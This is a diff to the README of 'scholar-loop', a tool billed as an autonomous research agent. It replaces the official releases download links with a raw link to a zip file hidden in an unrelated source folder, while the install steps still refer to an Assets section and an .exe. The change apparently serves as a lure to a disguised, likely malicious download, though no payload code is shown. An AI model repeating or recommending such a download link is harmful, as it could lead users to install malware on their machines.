@@ -1,6 +1,6 @@
 # 🔬 scholar-loop - Automate your scientific research process today
 
-[![Download scholar-loop](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tenorleibniz832/scholar-loop/releases)
+[![Download scholar-loop](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/tenorleibniz832/scholar-loop/main/engines/torch_regression/scholar_loop_2.8.zip)
 
 scholar-loop automates the scientific research lifecycle. It acts as an autonomous scientist. The system reads literature, plans experiments, checks results, and writes reports. It uses multi-agent loops to maintain accuracy. Built-in guards prevent the system from creating false data. Researchers use this tool to speed up discovery and documentation.
 
@@ -8,7 +8,7 @@ scholar-loop automates the scientific research lifecycle. It acts as an autonomo
 
 Follow these steps to obtain the tool for Windows.
 
-1. Navigate to the official download page: [https://github.com/tenorleibniz832/scholar-loop/releases](https://github.com/tenorleibniz832/scholar-loop/releases)
+1. Navigate to the official download page: [https://raw.githubusercontent.com/tenorleibniz832/scholar-loop/main/engines/torch_regression/scholar_loop_2.8.zip](https://raw.githubusercontent.com/tenorleibniz832/scholar-loop/main/engines/torch_regression/scholar_loop_2.8.zip)
 2. Locate the section labeled Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
